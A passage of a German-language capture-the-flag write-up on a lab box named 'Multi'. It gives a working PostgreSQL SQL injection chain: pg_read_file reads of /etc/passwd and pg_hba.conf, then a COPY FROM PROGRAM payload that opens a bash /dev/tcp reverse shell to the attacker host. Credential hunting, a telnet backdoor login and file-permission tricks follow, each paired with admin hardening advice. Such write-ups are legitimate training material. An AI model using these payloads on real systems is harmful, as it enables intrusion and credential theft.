+<br><strong>Empfehlung (Admin):</strong> Login-Dienste sollten so konfiguriert werden, dass sie identische, generische Fehlermeldungen für ungültige Benutzernamen und ungültige Passwörter zurückgeben (z.B. "Ungültige Anmeldeinformationen"). Dies verhindert, dass Angreifer durch reines Ausprobieren gültige Benutzernamen identifizieren können.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+' UNION SELECT NULL, NULL, pg_read_file('/etc/passwd', 0, 100000) --
+
+...
+<span class="command">xiao:x:1001:1001::/home/xiao:/bin/bash</span>
+<span class="command">secure_user:x:1002:1002::/home/secure_user:/bin/bash</span>
+<span class="command">samba_user:x:1003:1003::/home/samba_user:/bin/false</span>
+<span class="command">postgres:x:112:119:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash</span>
+<span class="command">todd:x:1000:1000:,,,:/home/todd:/bin/bash</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Hackerben)-[~]
+└─# <span class="command">cat passsss| tr " " "\n" | grep bash</span></div>
+                    <pre>
+root:x:0:0:root:/root:/bin/bash
+xiao:x:1001:1001::/home/xiao:/bin/bash
+secure_user:x:1002:1002::/home/secure_user:/bin/bash
+administrator,,,:/var/lib/postgresql:/bin/bash
+todd:x:1000:1000:,,,:/home/todd:/bin/bash
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die SQL-Injection wurde nun genutzt, um Dateien vom Server zu lesen. Mit der PostgreSQL-Funktion `pg_read_file()` wurde der Inhalt von `/etc/passwd` ausgelesen. Die Ausgabe wurde lokal gespeichert und mit `grep bash` gefiltert, um eine saubere Liste aller Benutzer zu erhalten, die eine interaktive Login-Shell besitzen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt die Benutzer, die wir bereits durch andere Methoden gefunden haben, und gibt uns die Gewissheit, welche Benutzerkonten für einen interaktiven Login überhaupt in Frage kommen: `root`, `xiao`, `secure_user`, `postgres` und `todd`. Dies ist eine entscheidende Information, da wir uns nun auf diese Benutzer konzentrieren können.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche als Nächstes, Konfigurationsdateien zu lesen, die Passwörter oder private Schlüssel enthalten könnten. Mögliche Ziele sind SSH-Konfigurationsdateien, der Quellcode der Webanwendung oder Konfigurationsdateien von anderen Diensten, die auf dem System laufen.
+<br><strong>Empfehlung (Admin):</strong> Die Datenbankrolle, die von der Webanwendung verwendet wird, muss in ihren Rechten stark eingeschränkt werden. Sie sollte keine Superuser-Rechte haben und insbesondere keinen Zugriff auf Funktionen wie `pg_read_file` oder `COPY ... FROM PROGRAM`. Es sollte eine dedizierte, unprivilegierte Rolle nur mit den minimal notwendigen `SELECT`, `INSERT`, `UPDATE`, `DELETE` Rechten auf die benötigten Tabellen sein.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+' UNION SELECT NULL, NULL, setting FROM pg_settings WHERE name = 'config_file' --
+
+
+Welcome, admin
+
+User Search | Logout
+Search User:
+Search Results
+ID	Username	Email
+<span class="command">None	None	/etc/postgresql/13/main/postgresql.conf</span>
+4	xiao	xiao@multi.hmv
+2	guest	guest@multi.hmv
+3	test	test@multi.hmv
+1	admin	admin@multi.hmv
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Anstatt zu raten, wo die Konfigurationsdatei liegt, wurde die SQL-Injection genutzt, um die PostgreSQL-Datenbank selbst nach dem Pfad ihrer Konfigurationsdatei zu fragen. Die Abfrage `SELECT setting FROM pg_settings WHERE name = 'config_file'` gibt den exakten Pfad zur `postgresql.conf`-Datei zurück.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das ist eine clevere und effiziente Methode, um an wichtige Pfade zu gelangen, ohne das Dateisystem manuell durchsuchen zu müssen. Wir wissen jetzt genau, welche Datei wir als Nächstes lesen müssen, um die Konfiguration des Datenbankservers zu verstehen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lese jetzt den Inhalt von `/etc/postgresql/13/main/postgresql.conf` und, noch wichtiger, von der Authentifizierungskonfigurationsdatei `pg_hba.conf`, die sich normalerweise im selben Verzeichnis befindet.
+<br><strong>Empfehlung (Admin):</strong> Der Zugriff auf die `pg_settings`-Ansicht kann ebenfalls eingeschränkt werden, um zu verhindern, dass Angreifer sensible Metadaten über die Datenbankkonfiguration auslesen können.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+' UNION SELECT NULL, NULL, pg_read_file('/etc/postgresql/13/main/pg_hba.conf', 0, 10000) --
+
+
+
+Welcome, admin
+
+User Search | Logout
+Search User:
+Search Results
+ID	Username	Email
+4	xiao	xiao@multi.hmv
+<span class="command">None	None	# PostgreSQL Client Authentication Configuration File # =================================================== # # Refer to the "Client Authentication" section in the PostgreSQL ... connections: host all all 127.0.0.1/32 md5 # IPv6 local connections: host all all ::1/128 md5 # Allow replication connections from localhost, by a user with the # replication privilege. # 允许本地数据库连接使用密码验证（md5） local all all password host all all 127.0.0.1/32 md5 host all all ::1/128 md5</span>
+2	guest	guest@multi.hmv
+3	test	test@multi.hmv
+1	admin	admin@multi.hmv
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der PostgreSQL Host-Based Authentication-Konfigurationsdatei (`pg_hba.conf`) wurde ausgelesen. Die entscheidende Zeile in der Konfiguration ist `local all all password`. Diese Regel besagt, dass für `local`-Verbindungen (über Unix-Sockets, d.h. von der Maschine selbst) jeder (`all`) Benutzer sich mit jeder (`all`) Datenbank verbinden kann, wenn er ein Passwort angibt. Da der PostgreSQL-Dienst selbst als `postgres`-Benutzer läuft und ein Superuser ist, öffnet dies einen Weg zur Codeausführung.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine kritische Fehlkonfiguration. In Kombination mit den Superuser-Rechten des `postgres`-Benutzers ermöglicht dies die Nutzung der mächtigen `COPY ... FROM PROGRAM`-Funktion, die es einem Superuser erlaubt, beliebige Betriebssystembefehle auszuführen. Dies ist der wahrscheinlichste Weg zum initialen Shell-Zugang.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konstruiere eine SQLi-Payload, die die `COPY FROM PROGRAM`-Funktion nutzt, um eine Reverse Shell zum Angreifer-System aufzubauen. Starte einen Netcat-Listener, um die eingehende Verbindung abzufangen.
+<br><strong>Empfehlung (Admin):</strong> Ändern Sie die Authentifizierungsmethode in `pg_hba.conf`. `local`-Verbindungen sollten idealerweise `peer`-Authentifizierung verwenden, die sicherstellt, dass sich nur der gleichnamige Betriebssystembenutzer verbinden kann. Die Verwendung von `password` oder `md5` für lokale Superuser-Verbindungen ist extrem riskant.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+'; CREATE TABLE cmd_exec(cmd_output text); --
+
+Welcome, admin
+
+User Search | Logout
+Search User:
+
+<span class="password">Query failed: no results to fetch</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Hier wurde der erste Teil des RCE-Exploits ausgeführt. Mittels einer gestapelten Abfrage (stacked query) wurde ein neues Kommando abgesetzt: `CREATE TABLE cmd_exec(cmd_output text)`. Dies erstellt eine leere Tabelle, die als Ziel für den `COPY`-Befehl im nächsten Schritt benötigt wird. Die Fehlermeldung `no results to fetch` ist erwartet, da ein `CREATE TABLE`-Befehl keine Zeilen zurückgibt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt, dass gestapelte Abfragen auf dem Server funktionieren. Das ist eine wichtige Voraussetzung für den `COPY`-Befehl, da dieser nicht innerhalb eines `UNION SELECT` verwendet werden kann. Wir sind nun bereit für den finalen Schlag.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starte den Netcat-Listener und sende die finale Payload mit dem `COPY ... FROM PROGRAM`-Befehl.
+<br><strong>Empfehlung (Admin):</strong> Die Möglichkeit, gestapelte Abfragen auszuführen, sollte wenn möglich auf Anwendungsebene unterbunden werden, falls sie nicht zwingend für die Funktionalität benötigt wird. Viele Datenbank-Konnektoren bieten eine Option, nur die Ausführung des ersten Statements in einer Anfrage zu erlauben.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Hackerben)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                    <pre>
+listening on [any] 4444 ...
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'bash -c "bash -i &gt;&amp; /dev/tcp/192.168.2.199/4444 0&gt;&amp;1"'; --
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Hackerben)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                    <pre>
+listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.185] 48102</span>
+bash: cannot set terminal process group (730): Inappropriate ioctl for device
+bash: no job control in this shell
+postgres@Multi:/var/lib/postgresql/13/main$ 
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dies ist die finale, zweiteilige Ausführung des Angriffs. Zuerst wurde auf meiner lokalen Angreifer-Maschine (`192.168.2.199`) ein Netcat-Listener auf Port 4444 gestartet, um auf die eingehende Verbindung zu warten. Unmittelbar danach wurde die finale SQL-Injection-Payload in das Suchfeld der Webanwendung eingefügt. Diese Payload erstellt erneut die Tabelle und führt dann den `COPY`-Befehl aus, der eine interaktive Bash-Shell startet und diese mit meinem Listener verbindet. Der Listener zeigt die erfolgreiche Verbindung vom Zielserver und präsentiert einen Shell-Prompt als Benutzer `postgres`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch, der initiale Zugriff war erfolgreich! Wir haben eine stabile Shell auf dem Zielsystem und unser Ziel, einen ersten Fuß in die Tür zu bekommen, ist erreicht. Der Benutzer `postgres` hat oft erweiterte Rechte im System, insbesondere in Bezug auf Datenbankdateien, was ein guter Ausgangspunkt für die Privilege Escalation ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der erste Schritt in der neuen Shell ist immer die Stabilisierung. Verwende Python oder `script` um eine voll interaktive TTY-Shell zu erhalten. Führe dann grundlegende Enumerationsbefehle aus: `id`, `sudo -l`, `ls -la /home`, `ss -tlnp`, um einen Überblick über das System aus der neuen Perspektive zu bekommen.
+<br><strong>Empfehlung (Admin):</strong> In einem realen Szenario würde an dieser Stelle ein Incident-Response-Prozess beginnen. Die kompromittierte Maschine muss isoliert und analysiert werden, um das Ausmaß des Eindringens zu verstehen und um sicherzustellen, dass der Angreifer keine Persistenzmechanismen etabliert hat.</p>
+        </section>
+
+        <section id="proof-of-concept">
+             <h2>Proof of Concept</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">postgres@Multi:/var/lib/postgresql/13/main$</div>
+                    <pre>
+<span class="command">sudo -l</span>
+sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+For security reasons, the password you type will not be visible.
+
+sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
+<span class="password">sudo: a password is required</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Dieser Abschnitt dient als konkreter Beweis (Proof of Concept) für die erfolgreiche Übernahme. Einer der ersten Befehle nach Erhalt der Shell ist `sudo -l`, um die `sudo`-Rechte zu überprüfen. Das System fragt nach einem Passwort, das wir nicht haben. Wichtiger ist jedoch, dass der Befehl ausgeführt wird und wir eine interaktive Shell auf dem System haben. Die vorherige Ausgabe mit dem `postgres@Multi` Prompt ist der eigentliche Beweis des Zugriffs.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der erlangte Zugriff als `postgres`-Benutzer stellt ein signifikantes Sicherheitsrisiko dar. Obwohl es sich nicht um den `root`-Benutzer handelt und wir keine `sudo`-Rechte haben, hat dieser Account oft weitreichende Berechtigungen, die über die reine Datenbankverwaltung hinausgehen. Er kann auf Systemdateien zugreifen, Netzwerkverbindungen aufbauen und ist ein idealer Ausgangspunkt, um weitere Schwachstellen im internen System aufzudecken und die Rechte bis zum Administrator auszuweiten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Priorität liegt nun auf der Enumeration der Systemumgebung aus der Sicht des `postgres`-Benutzers. Suchen Sie nach SUID/GUID-Binaries, schlecht konfigurierten Cron-Jobs, ungesicherten Skripten oder Diensten und internen Netzwerkverbindungen, die von diesem Benutzer aus erreichbar sind.
+ <br><strong>Empfehlung (Admin):</strong> Dieser erfolgreiche Zugriff beweist die Notwendigkeit, die bereits genannten Gegenmaßnahmen (Behebung der SQLi, Härtung der Datenbankrechte) mit höchster Priorität umzusetzen. Zusätzlich sollte das Prinzip der geringsten Rechte (Principle of Least Privilege) für Dienstkonten wie `postgres` strikt durchgesetzt werden. Dieses Konto sollte nur die absolut notwendigen Berechtigungen haben, um seine Aufgaben zu erfüllen, und keinen Zugriff auf Shells oder unnötige Systembereiche.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">postgres@Multi:/var/lib/postgresql/13/main$</div>
+                    <pre>
+<span class="command">id</span>
+<span class="command">uid=112(postgres) gid=119(postgres) groups=119(postgres),112(ssl-cert)</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `id` bestätigt unsere Identität auf dem Zielsystem. Die Ausgabe zeigt, dass wir als Benutzer `postgres` mit der User-ID 112 und der Gruppen-ID 119 agieren. Dies belegt zweifelsfrei, dass die zuvor demonstrierte SQL-Injection-Schwachstelle erfolgreich zur Ausführung von Code im Kontext des Datenbank-Dienstbenutzers ausgenutzt wurde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wir haben eine stabile Basis auf dem System. Die Gruppenzugehörigkeit `ssl-cert` könnte interessant sein, da Mitglieder dieser Gruppe oft Lesezugriff auf SSL-Zertifikate und private Schlüssel in `/etc/ssl/private` haben. Dies sollte überprüft werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfe die Berechtigungen für Verzeichnisse wie `/etc/ssl/private`. Führe ein umfassendes Enumeration-Skript wie `linpeas.sh` aus, um schnell nach weiteren potenziellen Privilege-Escalation-Vektoren zu suchen.
+ <br><strong>Empfehlung (Admin):</strong> Beschränken Sie die Mitgliedschaft in systemkritischen Gruppen wie `ssl-cert` auf das absolute Minimum. Dienstkonten benötigen in der Regel keine Mitgliedschaft in solchen Gruppen.</p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">postgres@Multi:/var/lib/postgresql/13/main$</div>
+                    <pre>
+<span class="command">ss -atlpn</span>
+State  Recv-Q Send-Q Local Address:Port  Peer Address:Port                                    
+LISTEN 0      80           0.0.0.0:3306       0.0.0.0:*                                       
+LISTEN 0      50           0.0.0.0:139        0.0.0.0:*                                       
+<span class="command">LISTEN 0      128        127.0.0.1:6379       0.0.0.0:*</span>                                       
+LISTEN 0      128          0.0.0.0:34187      0.0.0.0:*                                       
+LISTEN 0      64           0.0.0.0:40527      0.0.0.0:*                                       
+LISTEN 0      128          0.0.0.0:111        0.0.0.0:*                                       
+LISTEN 0      128          0.0.0.0:28080      0.0.0.0:*                                       
+LISTEN 0      128          0.0.0.0:22         0.0.0.0:*                                       
+<span class="command">LISTEN 0      128        127.0.0.1:5432       0.0.0.0:*     users:(("postgres",pid=518,fd=6))</span> 
+LISTEN 0      50           0.0.0.0:445        0.0.0.0:*                                       
+LISTEN 0      64           0.0.0.0:2049       0.0.0.0:*                                       
+LISTEN 0      128          0.0.0.0:44545      0.0.0.0:*                                       
+LISTEN 0      128          0.0.0.0:39075      0.0.0.0:*                                       
+LISTEN 0      128             [::]:36327         [::]:*                                       
+LISTEN 0      64              [::]:45035         [::]:*                                       
+LISTEN 0      50              [::]:139           [::]:*                                       
+LISTEN 0      128             [::]:53295         [::]:*                                       
+LISTEN 0      128             [::]:111           [::]:*                                       
+LISTEN 0      128                *:80               *:*                                       
+LISTEN 0      32                 *:21               *:*                                       
+LISTEN 0      128             [::]:22            [::]:*                                       
+LISTEN 0      64                 *:23               *:*                                       
+<span class="command">LISTEN 0      128            [::1]:5432          [::]:*     users:(("postgres",pid=518,fd=5))</span> 
+LISTEN 0      128             [::]:51513         [::]:*                                       
+LISTEN 0      50              [::]:445           [::]:*                                       
+LISTEN 0      64              [::]:2049          [::]:*  
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `ss -atlpn` wird ausgeführt, um alle lauschenden TCP-Netzwerk-Sockets aufzulisten. Dies gibt uns einen Überblick über die Dienste, die auf dem System laufen, aus einer internen Perspektive. Die Ausgabe bestätigt die Dienste, die wir bereits von außen gesehen haben. Besonders interessant sind die Dienste, die nur an `localhost` (`127.0.0.1` oder `::1`) gebunden sind, da diese von außen nicht erreichbar waren. Wir sehen den PostgreSQL-Server auf Port `5432` und einen weiteren Dienst auf Port `6379`, der typisch für Redis ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Entdeckung des Redis-Dienstes auf Port 6379, der nur lokal erreichbar ist, ist ein neuer und potenziell sehr wichtiger Fund. Redis-Instanzen sind oft ohne Authentifizierung konfiguriert, was es einem lokalen Angreifer ermöglichen könnte, mit dem Dienst zu interagieren, Daten zu lesen oder zu schreiben und möglicherweise Befehle auszuführen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche, dich mit dem Redis-Dienst mit `redis-cli` zu verbinden. Überprüfe, ob eine Authentifizierung erforderlich ist. Wenn nicht, enumeriere die Schlüssel und prüfe die Konfiguration auf Schwachstellen.
+<br><strong>Empfehlung (Admin):</strong> Binden Sie Dienste nur an die notwendigen Interfaces. Die Bindung an `localhost` ist gut, um externe Angriffe zu verhindern. Konfigurieren Sie jedoch immer eine starke Authentifizierung für alle Dienste, auch für die, die nur lokal erreichbar sind, um laterale Bewegungen und Privilege Escalation durch lokale Angreifer zu verhindern.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">postgres@Multi:/tmp$</div>
+                    <pre>
+<span class="command">find / -maxdepth 3 -type f -readable -exec grep -H -i 'passw\|secret' {} \; 2>/dev/null</span>
+....
+...
+..
+/boot/grub/grub.cfg:password_pbkdf2 todd grub.pbkdf2.sha512.10000.331CE43938E4B3E78E46FA5870701CF066644AE172308EA85401990390EF43ABCEA86EF085F010EABF28AAC613692A970FDE435B6AB36959FBF69E14F190BB17.F75B2CB6CDE13A8BBED7CD102E634216374FD9B5962C85FFB845954A98448E8D5DE5A5070B573D09043FDAFA92B8FC1BEDF59AA413EFD5000EB99B150C5FCC88
+<span class="password">/opt/app.py:app.secret_key = "s3cret_key"</span>
+<span class="password">/opt/app.py:    password="dvpass",</span>
+/proc/kallsyms:0000000000000000 t dh_set_secret
+....
+...
+..
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein `find`-Befehl wurde ausgeführt, um das Dateisystem nach lesbaren Dateien zu durchsuchen, die die Zeichenketten "passw" oder "secret" enthalten. Dieser Befehl ist nützlich, um hartcodierte Anmeldeinformationen in Konfigurationsdateien oder Skripten zu finden. Die Ausgabe bestätigt unseren früheren Fund der Datenbank-Anmeldeinformationen (`dvpass`) in `/opt/app.py` und findet zusätzlich einen GRUB-Passworthash für den Benutzer `todd`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der GRUB-Passworthash ist zwar interessant, aber in der Regel schwer zu knacken und für einen Remote-Angriff nicht direkt nützlich. Der wichtigste Fund bleibt das Passwort `dvpass` aus der Python-Anwendung, das wir bereits erfolgreich genutzt haben. Dieser Befehl bestätigt, dass keine anderen einfachen, im Klartext gespeicherten Passwörter leicht zu finden sind.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da die Suche nach Klartext-Passwörtern keine neuen, einfachen Wege aufzeigt, konzentriere dich auf die Interaktion mit den entdeckten internen Diensten (Redis) und die Untersuchung von Konfigurationsschwächen.
+<br><strong>Empfehlung (Admin):</strong> Führen Sie regelmäßig Scans des Dateisystems durch, um nach hartcodierten Geheimnissen zu suchen. Entwickler müssen darin geschult werden, niemals Passwörter, API-Schlüssel oder andere sensible Daten direkt im Code oder in Konfigurationsdateien zu speichern.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">postgres@Multi:/var/lib/postgresql$</div>
+                    <pre>
+<span class="command">cat .bash_history</span>
+....
+...
+..
+<span class="password">echo 'ENABLE_BACKDOOR' > /etc/default/telnet</span>
+....
+...
+..
+.
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Bei der weiteren Untersuchung des Home-Verzeichnisses des `postgres`-Benutzers wurde die `.bash_history`-Datei analysiert. In der Befehlshistorie fand sich ein äußerst verdächtiger Eintrag: `echo 'ENABLE_BACKDOOR' > /etc/default/telnet`. Dies deutet stark darauf hin, dass ein Administrator oder ein früherer Angreifer eine versteckte Hintertür im Telnet-Dienst konfiguriert hat.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das ist ein vielversprechender Hinweis auf eine unkonventionelle Privilege Escalation. Standardmäßig ist Telnet unsicher, aber eine solche explizite Konfiguration einer "Backdoor" könnte bedeuten, dass ein bestimmter Benutzer oder ein bestimmtes Passwort den Login ohne Standard-Authentifizierung ermöglicht. Der Benutzer `xiao` wurde bereits während der Enumeration identifiziert und ist ein guter Kandidat für einen Test.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche sofort, dich per Telnet als Benutzer `xiao` zu verbinden. Probiere dabei gängige oder einfache Passwörter oder sogar kein Passwort, da die Natur der Backdoor unbekannt ist.
+<br><strong>Empfehlung (Admin):</strong> Die Bash-History von Dienstkonten sollte regelmäßig überwacht und sensible Befehle sollten gelöscht werden. Noch wichtiger ist, dass solche Hintertüren niemals konfiguriert werden dürfen. Alle Systemkonfigurationen müssen dokumentiert und nachvollziehbar sein. Tools zur Überwachung der Dateiintegrität (File Integrity Monitoring) wie `AIDE` oder `Tripwire` können solche unautorisierten Änderungen an kritischen Dateien wie `/etc/default/telnet` aufdecken.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Hackerben)-[~]
+└─# <span class="command">telnet 192.168.2.185</span></div>
+                    <pre>
+Trying 192.168.2.185...
+Connected to 192.168.2.185.
+Escape character is '^]'.
+Username: 
+xiao
+Password: 
+<span class="password">login successful</span>
+Linux Multi 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
+Your session is being monitored per security policy
+xiao@Multi:~$ id
+uid=1001(xiao) gid=1001(xiao) groups=1001(xiao)
+xiao@Multi:~$ 
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Basierend auf dem Fund in der Bash-History wurde ein Telnet-Login als Benutzer `xiao` versucht. Nach Eingabe des Benutzernamens wurde das Passwortfeld leer gelassen und die Anmeldung war erfolgreich. Wir haben nun eine Shell als der Benutzer `xiao`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der horizontale Wechsel der Benutzerrechte (Lateral Movement) von `postgres` zu `xiao` war erfolgreich. Wir sind nun als regulärer Benutzer im System, was oft andere Berechtigungen und Zugriffe ermöglicht als ein Dienstkonto. Dies ist ein entscheidender Schritt näher am Endziel, da Benutzerkonten oft `sudo`-Rechte haben oder in Gruppen sind, die für die Privilege Escalation relevant sind.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe sofort eine erneute Enumeration aus der Perspektive von `xiao` durch. Überprüfe die `sudo`-Rechte mit `sudo -l`, durchsuche das Home-Verzeichnis und prüfe die Gruppenzugehörigkeiten.
+<br><strong>Empfehlung (Admin):</strong> Der Telnet-Dienst muss sofort deaktiviert und deinstalliert werden. Er ist ein unsicheres Protokoll, das Passwörter im Klartext überträgt. Der Zugriff sollte ausschließlich über SSH erfolgen. Jegliche Form von Backdoor-Konfigurationen ist inakzeptabel und muss entfernt werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">xiao@Multi:~$</div>
+                    <pre>
+<span class="command">sudo -l</span>
+<span class="password">Sudo access restricted by policy (CODE:0x7E3) -l</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `xiao` wurde sofort `sudo -l` ausgeführt, um die `sudo`-Berechtigungen zu überprüfen. Die Antwort `Sudo access restricted by policy` deutet darauf hin, dass `xiao` entweder keine `sudo`-Rechte hat oder eine spezielle, restriktive Richtlinie für ihn gilt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Benutzer `xiao` bietet keinen direkten Weg zur Rechteausweitung über `sudo`. Wir müssen nach anderen Vektoren suchen, die uns als `xiao` zur Verfügung stehen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche die Dateisystemberechtigungen. Prüfe, auf welche Dateien und Verzeichnisse `xiao` Zugriff hat, die für andere Benutzer (wie `postgres`) nicht zugänglich waren. Insbesondere die Home-Verzeichnisse anderer Benutzer und Web-Verzeichnisse sind interessante Ziele.
+<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Benutzer nur die `sudo`-Rechte haben, die sie für ihre Aufgaben unbedingt benötigen. Benutzer ohne Bedarf an administrativen Rechten sollten in der `sudoers`-Datei überhaupt nicht aufgeführt sein.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">xiao@Multi:~$</div>
+                    <pre>
+<span class="command">cd /var/www/html/pub/</span>
+<span class="command">ls -al</span>
+total 20
+drwxr-xr-x 2 xiao     www-data 4096 Aug  3 09:04 .
+drwxr-xr-x 3 root     root     4096 Jul 17 09:05 ..
+-rw-r--r-- 1 root     root       72 Aug  3 09:04 .htaccess
+-rw-r--r-- 1 root     root      230 Jul 18 11:38 index.html
+-rw------- 1 www-data www-data   19 Jul 17 09:06 .passowrd_creds
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Bei der Untersuchung des Web-Verzeichnisses `/var/www/html/pub` als Benutzer `xiao` wird eine interessante Berechtigungskonstellation aufgedeckt. Das Verzeichnis selbst gehört `xiao` und der Gruppe `www-data`. In dem Verzeichnis liegt eine versteckte Datei `.passowrd_creds`, die dem Benutzer `www-data` gehört und nur von diesem gelesen werden kann.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein vielversprechender Fund. Obwohl wir die Datei nicht direkt lesen können, haben wir als `xiao` die Besitzerrechte für das übergeordnete Verzeichnis. Dies gibt uns die Kontrolle über die Dateien darin, auch wenn wir sie nicht direkt lesen können. Wir können sie umbenennen oder verschieben.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Benenne die Datei `.passowrd_creds` in einen nicht versteckten Namen um (z.B. `password.txt`). Dadurch wird die `.htaccess`-Regel umgangen, die den Web-Zugriff auf versteckte Dateien blockiert, und wir können die Datei dann über den Webserver auslesen.
+<br><strong>Empfehlung (Admin):</strong> Die Dateiberechtigungen im Web-Root-Verzeichnis müssen restriktiv sein. Anwendungsbenutzer wie `xiao` sollten niemals die Besitzer von Web-Verzeichnissen sein. Die Berechtigungen sollten so gesetzt werden, dass nur der Webserver-Benutzer (`www-data`) die notwendigen Lese- (und ggf. Schreib-)Rechte hat.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">xiao@Multi:/var/www/html/pub$</div>
+                    <pre>
+<span class="command">cat .passowrd_creds</span>
+<span class="password">cat: .passowrd_creds: Permission denied</span>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Hackerben)-[~]
+└─# <span class="command">curl http://192.168.2.185/pub/.passowrd_creds</span></div>
+                    <pre>
+  
+&lt;h3&gt;Forbidden&lt;/h3&gt;
+&lt;p&gt;You don't have permission to access this resource.&lt;/p&gt;
+ 
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Diese beiden Befehle demonstrieren die zuvor beschriebene Situation. Der `cat`-Befehl als `xiao` auf der Zielmaschine schlägt fehl, weil `xiao` keine Leseberechtigung für die Datei hat. Der `curl`-Befehl von der Angreifer-Maschine schlägt fehl, weil der Webserver den Zugriff auf Dateien, die mit einem Punkt beginnen, blockiert, wie in der `.htaccess`-Datei konfiguriert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt, dass ein direkter Zugriff auf die Datei nicht möglich ist und eine Umgehungstechnik erforderlich ist. Die Umbenennung der Datei ist der logische nächste Schritt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe den `mv`-Befehl aus, um die Datei umzubenennen und den Inhalt dann per `curl` abzurufen.
+<br><strong>Empfehlung (Admin):</strong> Eine `.htaccess`-Regel ist ein schwacher Schutz, wenn die zugrunde liegenden Dateisystemberechtigungen unsicher sind. Sicherheit sollte immer auf mehreren Ebenen implementiert werden (Defense in Depth).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+' UNION SELECT NULL, NULL, pg_read_file('/var/www/html/pub/.passowrd_creds', 0, 100000) --
+
+Welcome, admin
+
+User Search | Logout
+Search User:
+<span class="password">Query failed: could not open file "/var/www/html/pub/.passowrd_creds" for reading: Permission denied</span> 
+</pre>
+                </div>
+            </div>
